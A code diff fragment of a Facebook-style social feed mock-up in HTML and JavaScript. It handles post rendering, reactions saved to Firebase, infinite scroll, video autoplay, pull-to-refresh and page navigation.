+                                        <a href="#" style="text-decoration: none; color: inherit;" class="click-effect" onclick="event.stopPropagation();navigateTo('profile')"><h4>${postName}</h4></a>
+                                        <div class="post-time-privacy"><span>${item.time || 'Just now'}</span> • <i class="fa-solid fa-earth-americas" style="font-size: 10px;"></i></div>
+                                    </div>
+                                </div>
+                                <div class="post-actions-right" onclick="event.stopPropagation();">
+                                    <a href="#" style="color: inherit;" class="click-effect" onclick="event.stopPropagation();navigateTo('options')"><i class="fa-solid fa-ellipsis"></i></a>
+                                    <a href="#" style="color: inherit;" class="click-effect" onclick="event.stopPropagation();navigateTo('hide')"><i class="fa-solid fa-xmark"></i></a>
+                                </div>
+                            </div>
+
+                            ${captionHTML}
+                            ${mediaHTML}
+
+                            <div class="post-stats" onclick="event.stopPropagation();">
+                                <div class="post-stats-left">
+                                    <div class="post-stat-icons" id="statIcons-${postId}"><span>${likesEmoji}</span></div>
+                                    <span id="statCount-${postId}">${likesCount}</span>
+                                </div>
+                                <div class="post-stats-right"><span>${commentsText}</span></div>
+                            </div>
+
+                            <div class="post-action-buttons" onclick="event.stopPropagation();">
+                                <div class="reaction-popup" id="reactionPopup-${postId}">
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '👍', 'Like')">👍</span>
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '❤️', 'Love')">❤️</span>
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '🫂', 'Care')">🫂</span>
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '😆', 'Haha')">😆</span>
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '😢', 'Sad')">😢</span>
+                                    <span class="reaction-icon" onclick="event.stopPropagation();handleReactionFromPopup('${postId}', '😡', 'Angry')">😡</span>
+                                </div>
+
+                                <button class="action-btn click-effect ${btnClass}" id="likeBtn-${postId}" 
+                                    onclick="event.stopPropagation();handleSingleLikeClick('${postId}')" 
+                                    onmousedown="event.stopPropagation();startLongPress('${postId}')" 
+                                    onmouseup="event.stopPropagation();cancelLongPress('${postId}')" 
+                                    ontouchstart="event.stopPropagation();startLongPress('${postId}')" 
+                                    ontouchend="event.stopPropagation();cancelLongPress('${postId}')">
+                                    <span id="btnIcon-${postId}">${btnIconHTML}</span> 
+                                    <span id="btnText-${postId}">${btnTextHTML}</span>
+                                </button>
+                                <button class="action-btn click-effect" onclick="event.stopPropagation();openPostDetail('${postId}')">
+                                    <i class="fa-regular fa-comment"></i> Comment
+                                </button>
+                                <button class="action-btn click-effect" onclick="event.stopPropagation();navigateTo('share')">
+                                    <i class="fa-solid fa-share"></i> Share
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                }
+            });
+
+            feedContainer.innerHTML += htmlContent;
+            initIntersectionVideoObserver();
+            updateLoadMoreState();
+
+            if (displayedCount >= feedItems.length) {
+                allLoaded = true;
+                updateLoadMoreState();
+            }
+
+            isLoadingMore = false;
+            const spinner = document.getElementById('scrollTrigger').querySelector('.loader-spinner');
+            if (spinner) spinner.style.display = 'none';
+        }
+
+        function updateLoadMoreState() {
+            const trigger = document.getElementById('scrollTrigger');
+            const loadMoreText = document.getElementById('loadMoreText');
+            const loaderSpinner = trigger.querySelector('.loader-spinner');
+            
+            if (allLoaded || displayedCount >= feedItems.length) {
+                allLoaded = true;
+                if (loadMoreText) loadMoreText.textContent = 'No more posts to load';
+                if (loaderSpinner) loaderSpinner.style.display = 'none';
+            } else {
+                if (loadMoreText) loadMoreText.textContent = 'Load more posts';
+                if (loaderSpinner) loaderSpinner.style.display = 'none';
             }
         }
+
+        // ============================================================
+        // INFINITE SCROLL - Intersection Observer
+        // ============================================================
+        let infiniteObserver = null;
+
+        function setupInfiniteScroll() {
+            const trigger = document.getElementById('scrollTrigger');
+            if (!trigger) return;
+
+            if (infiniteObserver) {
+                infiniteObserver.disconnect();
+            }
+
+            infiniteObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting && !isLoadingMore && !allLoaded && feedItems.length > 0) {
+                        loadMorePosts();
+                    }
+                });
+            }, {
+                root: null,
+                rootMargin: '0px 0px 100px 0px',
+                threshold: 0.1
+            });
+
+            infiniteObserver.observe(trigger);
+        }
+
+        // ============================================================
+        // POST DETAIL - Opens open.html
+        // ============================================================
+        function openPostDetail(postId) {
+            // Store post ID and current scroll position before navigating
+            localStorage.setItem('postToOpen', postId);
+            localStorage.setItem('lastScrollPosition', window.scrollY);
+            localStorage.setItem('lastPage', 'home');
+            window.location.href = 'open.html';
+        }
+
+        // ============================================================
+        // SINGLE CLICK LIKE/UNLIKE
+        // ============================================================
+        function handleSingleLikeClick(postId) {
+            const btnText = document.getElementById(`btnText-${postId}`);
+            if (!btnText) return;
+            
+            const isLiked = btnText.innerText === 'Liked';
+            
+            if (isLiked) {
+                saveReactionToFirebase(postId, '', '');
+            } else {
+                saveReactionToFirebase(postId, '👍', 'Like');
+            }
+        }
+
+        function handleReactionFromPopup(postId, emoji, text) {
+            const popup = document.getElementById(`reactionPopup-${postId}`);
+            if (popup) popup.classList.remove('show');
+            saveReactionToFirebase(postId, emoji, text);
+        }
+
+        let pressTimer = null;
+
+        function startLongPress(postId) {
+            pressTimer = setTimeout(() => {
+                const popup = document.getElementById(`reactionPopup-${postId}`);
+                if (popup) {
+                    popup.classList.add('show');
+                }
+            }, 500);
+        }
+
+        function cancelLongPress(postId) {
+            clearTimeout(pressTimer);
+        }
+
+        // ============================================================
+        // INTERSECTION OBSERVER FOR VIDEO
+        // ============================================================
+        function initIntersectionVideoObserver() {
+            const allVideos = document.querySelectorAll('.feed-video');
+
+            const observerOptions = {
+                root: null,
+                rootMargin: '0px',
+                threshold: 0.5
+            };
+
+            const videoObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    const video = entry.target;
+                    if (entry.isIntersecting) {
+                        video.play().catch(() => {});
+                    } else {
+                        if (!video.paused) video.pause();
+                    }
+                });
+            }, observerOptions);
+
+            allVideos.forEach(video => {
+                videoObserver.observe(video);
+                video.onplay = function() {
+                    allVideos.forEach(other => {
+                        if (other !== video && !other.paused) other.pause();
+                    });
+                };
+            });
+        }
+
+        // ============================================================
+        // SWIPE REFRESH
+        // ============================================================
+        let startY = 0;
+        let pulling = false;
+        const refreshIndicator = document.getElementById('refreshIndicator');
+
+        window.addEventListener('touchstart', (e) => {
+            if (window.scrollY === 0 && document.getElementById('homeView').classList.contains('active-view')) {
+                startY = e.touches[0].clientY;
+                pulling = true;
+            }
+        });
+
+        window.addEventListener('touchmove', (e) => {
+            if (!pulling) return;
+            const currentY = e.touches[0].clientY;
+            const diff = currentY - startY;
+
+            if (diff > 0 && diff < 150) {
+                refreshIndicator.style.opacity = diff / 100;
+                refreshIndicator.style.transform = `translateX(-50%) translateY(${diff * 0.5}px)`;
+                refreshIndicator.querySelector('i').style.transform = `rotate(${diff * 2}deg)`;
+            } else if (diff >= 150) {
+                refreshIndicator.style.opacity = 1;
+            }
+        });
+
+        window.addEventListener('touchend', (e) => {
+            if (!pulling) return;
+            pulling = false;
+            const endY = e.changedTouches[0].clientY;
+            const diff = endY - startY;
+
+            if (diff > 100) {
+                refreshIndicator.classList.add('spinning');
+                refreshIndicator.style.transform = `translateX(-50%) translateY(50px)`;
+                document.querySelectorAll('.feed-video').forEach(v => v.pause());
+                
+                setTimeout(() => {
+                    renderFeed();
+                    refreshIndicator.classList.remove('spinning');
+                    refreshIndicator.style.opacity = 0;
+                    refreshIndicator.style.transform = `translateX(-50%) translateY(-50px)`;
+                    window.scrollTo(0, 0);
+                }, 800);
+            } else {
+                refreshIndicator.style.opacity = 0;
+                refreshIndicator.style.transform = `translateX(-50%) translateY(-50px)`;
+            }
+        });
+
+        // ============================================================
+        // VIEW SWITCH
+        // ============================================================
+        function switchView(viewName) {
+            document.querySelectorAll('.feed-video').forEach(v => v.pause());
+            const homeView = document.getElementById('homeView');
+            const menuView = document.getElementById('menuView');
+            const navTabs = document.querySelectorAll('.fb-nav-tabs .nav-tab');
+
+            if (viewName === 'menu') {
+                homeView.classList.remove('active-view');
+                menuView.classList.add('active-view');
+                navTabs.forEach((tab, index) => {
+                    if (index === navTabs.length - 1) tab.classList.add('active');
+                    else tab.classList.remove('active');
+                });
+                window.scrollTo(0, 0);
+            } else {
+                menuView.classList.remove('active-view');
+                homeView.classList.add('active-view');
+                navTabs.forEach((tab, index) => {
+                    if (index === 0) tab.classList.add('active');
+                    else tab.classList.remove('active');
+                });
+                const saved = pageState.scrollPositions['home'] || 0;
+                setTimeout(() => window.scrollTo(0, saved), 50);
+            }
+        }
+
+        function toggleMenu() {
+            const menuView = document.getElementById('menuView');
+            if (menuView.classList.contains('active-view')) {
+                switchView('home');
+            } else {
+                switchView('menu');
+            }
+        }
+
+        // ============================================================
+        // SPA NAVIGATION - All links go to error.html
+        // ============================================================
+        function navigateTo(page, event) {
+            if (event) event.preventDefault();
+            
+            // Save current scroll position
+            pageState.scrollPositions[pageState.current] = window.scrollY;
+            
+            if (page === 'home') {
+                switchView('home');
+                pageState.current = 'home';
+                const saved = pageState.scrollPositions['home'] || 0;
+                setTimeout(() => window.scrollTo(0, saved), 50);
+                return;
+            }
+            
+            // For all other pages, navigate to error.html
+            localStorage.setItem('lastPage', pageState.current);
+            localStorage.setItem('lastScrollPosition', window.scrollY);
+            window.location.href = 'error.html';
+        }
+
+        // ============================================================
+        // CLOSE POPUPS ON CLICK OUTSIDE
+        // ============================================================
+        window.addEventListener('click', (e) => {
+            if (!e.target.closest('.action-btn')) {
+                document.querySelectorAll('.reaction-popup').forEach(popup => {
+                    popup.classList.remove('show');
+                });
+            }
+        });
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        window.addEventListener('DOMContentLoaded', () => {
+            // Restore scroll position if coming back from another page
+            const savedPos = localStorage.getItem('lastScrollPosition');
+            const lastPage = localStorage.getItem('lastPage');
+            
+            if (savedPos && lastPage === 'home') {
+                setTimeout(() => {
+                    window.scrollTo(0, parseInt(savedPos));
+                    // Clear after restoring
+                    localStorage.removeItem('lastScrollPosition');
+                    localStorage.removeItem('lastPage');
+                }, 300);
+            }
+            
+            seedFirebaseIfEmpty();
+            setTimeout(() => {
+                renderFeed();
+                setupInfiniteScroll();
+            }, 300);
+        });
+
+        // ============================================================
+        // LIVE UPDATES (cross-device sync)
+        // ============================================================
+        database.ref('feedItems').on('child_changed', (snapshot) => {
+            const data = snapshot.val();
+            const postId = snapshot.key;
+            const userEmail = currentUser.email || 'anonymous';
+            const likedBy = data.likedBy || {};
+            const userReaction = likedBy[userEmail] || null;
+            updatePostUI(postId, data.likesCount || 0, data.likesEmoji || '👍', userReaction);
+        });
+
+        // Push initial state
+        history.pushState({ page: 'home' }, '', '#');
     </script>
 </body>
 </html>
